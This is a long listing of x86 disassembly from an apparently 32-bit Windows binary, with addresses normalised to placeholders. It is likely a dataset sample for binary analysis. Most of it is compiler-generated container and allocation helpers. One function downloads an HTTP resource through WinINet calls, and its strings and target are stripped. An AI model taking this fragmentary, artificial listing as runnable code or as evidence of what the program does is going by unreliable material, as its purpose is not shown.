mov eax [ eax ]
mov [ ebp - 0x4 ] eax
lea ecx [ ebp + 0x10 ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
mov esi eax
lea ecx [ ebp + 0x8 ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
mov ecx [ esi ]
mov [ eax ] ecx
lea ecx [ ebp + 0xc ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
mov esi eax
lea ecx [ ebp + 0x10 ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
mov edx [ esi ]
mov [ eax ] edx
lea ecx [ ebp + 0xc ]
call sub_4011a0
push eax
call sub_414860
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_418800
push ebp
mov ebp esp
push 0xffffffff
push sub_43aff1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0x8 ]
push eax
push 0x18
call sub_401000
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x10 ]
call sub_401790
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_4188e0
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
call sub_418b20
mov [ ebp - 0x4 ] eax
cvtsi2sd xmm0 [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
shr eax 0x1f
addsd xmm0 [ eax * 8 + r--data ]
movsd [ ebp - 0x1c ] xmm0
cvtsd2ss xmm0 [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
movss [ ebp - 0x10 ] xmm0
call sub_4188c0
mov [ ebp - 0xc ] eax
cvtsi2sd xmm0 [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
shr ecx 0x1f
addsd xmm0 [ ecx * 8 + r--data ]
movsd [ ebp - 0x24 ] xmm0
cvtsd2ss xmm0 [ ebp - 0x24 ]
movss xmm1 [ ebp - 0x10 ]
divss xmm1 xmm0
movss [ ebp - 0x14 ] xmm1
fld [ ebp - 0x14 ]
mov esp ebp
pop ebp
retn
sub_418980
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] ecx
push 0x1
lea ecx [ ebp - 0xc ]
call sub_40e0b0
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x14 ]
call sub_414590
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov ecx [ ebp - 0x14 ]
call sub_417200
mov ecx eax
call sub_411e30
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0xc ]
call sub_4188a0
jmp r-xdata
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_40e0b0
lea ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x14 ]
call sub_417200
lea edx [ ebp - 0xc ]
push edx
lea ecx [ ebp - 0x8 ]
call sub_411e00
mov [ ebp - 0xd ] al
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_414d40
push eax
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx [ ebp - 0x14 ]
call sub_417f30
movzx edx [ ebp - 0xd ]
test edx edx
je r-xdata
sub_418a30
push ebp
mov ebp esp
sub esp 0xc
push esi
mov [ ebp - 0x8 ] ecx
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp + 0xc ]
call sub_418b40
mov ecx eax
call sub_4011a0
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx ]
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_414fe0
mov eax [ ebp + 0x8 ]
pop esi
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
push eax
call sub_402180
add esp 0x4
mov esi eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_414860
add esp 0x4
mov edx [ eax ]
push edx
call sub_402180
add esp 0x4
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_414860
add esp 0x4
mov esi eax
mov eax [ ebp - 0x4 ]
push eax
call sub_402180
add esp 0x4
mov ecx [ eax ]
push ecx
call sub_414860
add esp 0x4
mov edx [ esi ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_414790
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
sub_418af0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call sub_414860
add esp 0x4
mov edx [ ebp - 0x4 ]
mov eax [ eax ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_418b40
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_40e0b0
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0xc ]
call sub_415360
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
sub_418b90
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
lea ecx [ ebp + 0x8 ]
call sub_4011a0
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_414860
add esp 0x4
mov edx [ eax ]
push edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_418f80
mov [ ebp - 0x8 ] eax
push 0x1
mov ecx [ ebp - 0xc ]
call sub_418ee0
mov ecx [ ebp - 0x4 ]
push ecx
call sub_414860
add esp 0x4
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
push eax
call sub_414860
add esp 0x4
mov ecx [ eax ]
push ecx
call sub_402180
add esp 0x4
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov esp ebp
pop ebp
retn 0x8
sub_418c10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov dl [ eax ]
mov [ ecx + 0x4 ] dl
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
sub_418cb0
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ edx ] ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x1
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x8 ]
add ecx 0x4
mov [ ebp + 0x8 ] ecx
sub_418ce0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_419060
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_418d00
push ebp
mov ebp esp
push 0xffffffff
push sub_43aff1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0x8 ]
push eax
push 0x8
call sub_401000
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ecx
call sub_402180
add esp 0x4
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_418d90
push ebp
mov ebp esp
push 0xffffffff
push sub_43b190
mov eax [ fs : 0x0 ]
push eax
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0x14 ]
call sub_419080
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
add ecx 0x4
mov [ ebp + 0x10 ] ecx
mov edx [ ebp + 0x8 ]
add edx 0x4
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418df7
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0x10 ]
je r-xdata
push 0x0
push 0x0
call sub_42569b
mov eax r-xdata
retn
mov edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp + 0x14 ]
call sub_418ce0
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x4
mov [ ebp - 0x14 ] eax
sub_418e50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_4190b0
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_418e80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401830
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_418eb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_412140
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_418ee0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_418f20
mov ecx [ ebp - 0x4 ]
sub eax [ ecx + 0x4 ]
sub eax 0x1
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
add eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov esp ebp
pop ebp
retn 0x4
push r--data
call sub_4215f6
sub_418f20
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_418f40
mov esp ebp
pop ebp
retn
sub_418f80
push ebp
mov ebp esp
push 0xffffffff
push sub_43b120
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x18 ]
call sub_415d30
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x10 ]
push edx
call sub_402180
add esp 0x4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
push eax
call sub_4150a0
add esp 0x4
mov [ ebp - 0x24 ] eax
lea ecx [ ebp - 0x11 ]
push ecx
mov ecx [ ebp - 0x18 ]
call sub_401a60
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x28 ]
call sub_4190e0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_419011
push 0x1
mov ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x12 ]
push edx
mov ecx [ ebp - 0x18 ]
call sub_401a60
mov ecx eax
call sub_401d80
push 0x0
push 0x0
call sub_42569b
mov eax r-xdata
retn
sub_419080
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_419130
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_4190b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push 0x0
call sub_419160
add esp 0x10
pop ebp
retn
sub_4190e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_419180
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_419130
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push 0x0
call sub_4191a0
add esp 0x10
pop ebp
retn
sub_419160
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_4191c0
pop ebp
retn
sub_419180
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4191f0
pop ebp
retn
sub_4191a0
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_419280
pop ebp
retn
sub_4191c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_4192b0
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_4191f0
push ebp
mov ebp esp
push 0xffffffff
push sub_43aff1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0x8 ]
push eax
push 0x1c
call sub_401000
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
push 0x0
mov ecx [ ebp + 0xc ]
push ecx
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x10 ]
call sub_419310
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_419280
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_419390
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_4192b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4192d0
pop ebp
retn
sub_4192d0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0x8 ]
push eax
push 0x4
call sub_401000
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_419310
push ebp
mov ebp esp
push 0xffffffff
push sub_43bdf8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x10 ]
call sub_410020
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
add ecx 0x18
push ecx
call sub_402180
add esp 0x4
mov edx [ ebp - 0x10 ]
mov eax [ eax ]
mov [ edx + 0x18 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_419390
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_4193b0
pop ebp
retn
sub_4193b0
push ebp
mov ebp esp
push 0xffffffff
push sub_43aff1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0x8 ]
push eax
push 0x4
call sub_401000
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ecx
call sub_402180
add esp 0x4
mov edx [ eax ]
mov eax [ ebp - 0x10 ]
mov [ eax ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_419470
push ebp
mov ebp esp
push 0xffffffff
push sub_43bc91
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x30 ] 0x0
push r--data
lea ecx [ ebp - 0x28 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x3c ]
jge r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_410020
mov edx [ ebp - 0x30 ]
or edx 0x2
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x3c ]
sub edx 0x4
cmp [ ebp - 0x2c ] edx
jge r-xdata
mov [ ebp - 0x38 ] 0x0
push 0x5
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x5c ]
call sub_40ffd0
mov [ ebp - 0x44 ] eax
mov edx [ ebp - 0x44 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x30 ]
or eax 0x1
mov [ ebp - 0x30 ] eax
push r--data
mov ecx [ ebp - 0x40 ]
push ecx
call sub_416540
add esp 0x8
movzx edx al
test edx edx
je r-xdata
movzx edx [ ebp - 0x31 ]
test edx edx
je r-xdata
and [ ebp - 0x30 ] 0xfffffffe
lea ecx [ ebp - 0x5c ]
call sub_401830
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_410210
mov dl [ eax ]
movzx eax dl
push eax
lea ecx [ ebp - 0x28 ]
call sub_4101f0
push 0x2b
lea ecx [ ebp - 0x28 ]
call sub_4101f0
mov eax [ ebp - 0x2c ]
add eax 0x4
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov al [ ebp - 0x38 ]
mov [ ebp - 0x31 ] al
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x30 ]
and ecx 0x1
je r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_4195e0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bc42
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0xcdec
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0xcd80 ] ecx
mov [ ebp - 0xcd20 ] 0x0
push r--data
lea ecx [ ebp - 0xccb8 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x0
xor eax eax
mov [ ebp - 0x464 ] ax
push 0x206
push 0x0
lea ecx [ ebp - 0x462 ]
push ecx
call sub_427900
add esp 0xc
xor edx edx
mov [ ebp - 0x25c ] dx
push 0x206
push 0x0
lea eax [ ebp - 0x25a ]
push eax
call sub_427900
add esp 0xc
push 0x3c
push 0x0
lea ecx [ ebp - 0xcd18 ]
push ecx
call sub_427900
add esp 0xc
mov [ ebp - 0xcd18 ] 0x3c
mov [ ebp - 0xcce4 ] 0x0
mov [ ebp - 0xcce0 ] 0x0
lea edx [ ebp - 0x464 ]
mov [ ebp - 0xcd08 ] edx
mov [ ebp - 0xcd04 ] 0x103
mov [ ebp - 0xccf4 ] 0x0
mov [ ebp - 0xccf0 ] 0x0
mov [ ebp - 0xcd14 ] 0x0
mov [ ebp - 0xcd10 ] 0x0
lea eax [ ebp - 0x25c ]
mov [ ebp - 0xccec ] eax
mov [ ebp - 0xcce8 ] 0x103
lea ecx [ ebp - 0xcd18 ]
push ecx
push 0x80000000
mov ecx [ ebp + 0xc ]
call sub_401890
push eax
mov ecx [ ebp + 0xc ]
call sub_40be90
push eax
call [ InternetCrackUrlW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0xcd34 ] 0x0
mov [ ebp - 0xcd38 ] 0x0
mov [ ebp - 0xcd28 ] 0x0
mov [ ebp - 0xcd19 ] 0x1
lea ecx [ ebp - 0xcca0 ]
call sub_40ffa0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x2
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0xccb8 ]
call sub_40be90
push eax
call [ InternetOpenW@IAT ]
mov [ ebp - 0xcd34 ] eax
cmp [ ebp - 0xcd34 ] 0x0
jne r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov edx [ ebp - 0xcd20 ]
or edx 0x1
mov [ ebp - 0xcd20 ] edx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xccb8 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push 0x0
push 0x3
push r--data
push r--data
push 0x0
lea edx [ ebp - 0x464 ]
push edx
mov eax [ ebp - 0xcd34 ]
push eax
call [ InternetConnectW@IAT ]
mov [ ebp - 0xcd38 ] eax
cmp [ ebp - 0xcd38 ] 0x0
jne r-xdata
mov [ ebp - 0xcd58 ] r--data
lea eax [ ebp - 0xcd58 ]
push eax
lea ecx [ ebp - 0xcd90 ]
call sub_42392e
push r--data
lea ecx [ ebp - 0xcd90 ]
push ecx
call sub_42569b
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
push 0x0
push 0x80000100
push 0x0
push 0x0
push r--data
lea eax [ ebp - 0x25c ]
push eax
push r--data
mov ecx [ ebp - 0xcd38 ]
push ecx
call [ HttpOpenRequestW@IAT ]
mov [ ebp - 0xcd28 ] eax
cmp [ ebp - 0xcd28 ] 0x0
jne r-xdata
mov [ ebp - 0xcd74 ] r--data
lea ecx [ ebp - 0xcd74 ]
push ecx
lea ecx [ ebp - 0xcd9c ]
call sub_42392e
push r--data
lea edx [ ebp - 0xcd9c ]
push edx
call sub_42569b
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0xcd28 ]
push ecx
call [ HttpSendRequestW@IAT ]
mov [ ebp - 0xcd4c ] eax
cmp [ ebp - 0xcd4c ] 0x0
jne r-xdata
mov [ ebp - 0xcd70 ] r--data
lea edx [ ebp - 0xcd70 ]
push edx
lea ecx [ ebp - 0xcda8 ]
call sub_42392e
push r--data
lea eax [ ebp - 0xcda8 ]
push eax
call sub_42569b
mov [ ebp - 0xcc70 ] 0x40
push 0x0
lea ecx [ ebp - 0xcc70 ]
push ecx
lea edx [ ebp - 0x54 ]
push edx
push 0x5
mov eax [ ebp - 0xcd28 ]
push eax
call [ HttpQueryInfoW@IAT ]
mov [ ebp - 0xcd5c ] eax
mov [ ebp - 0xcd2c ] 0x0
cmp [ ebp - 0xcd5c ] 0x0
je r-xdata
mov [ ebp - 0xcd50 ] r--data
lea edx [ ebp - 0xcd50 ]
push edx
lea ecx [ ebp - 0xcdb4 ]
call sub_42392e
push r--data
lea eax [ ebp - 0xcdb4 ]
push eax
call sub_42569b
mov [ ebp - 0xcd2c ] 0xc800
lea ecx [ ebp - 0x54 ]
push ecx
call sub_42314c
add esp 0x4
mov [ ebp - 0xcd2c ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0xcd2c ] 0xc800
jb r-xdata
mov [ ebp - 0xcd44 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0xcd2c ]
mov [ ebp - 0xcd3c ] eax
mov [ ebp - 0xcd3c ] 0xc800
jmp r-xdata
cmp [ ebp - 0xcd28 ] 0x0
je r-xdata
mov ecx [ ebp - 0xcd44 ]
add ecx [ ebp - 0xcc6c ]
mov [ ebp - 0xcd44 ] ecx
mov edx [ ebp - 0xcd2c ]
sub edx [ ebp - 0xcc6c ]
mov [ ebp - 0xcd2c ] edx
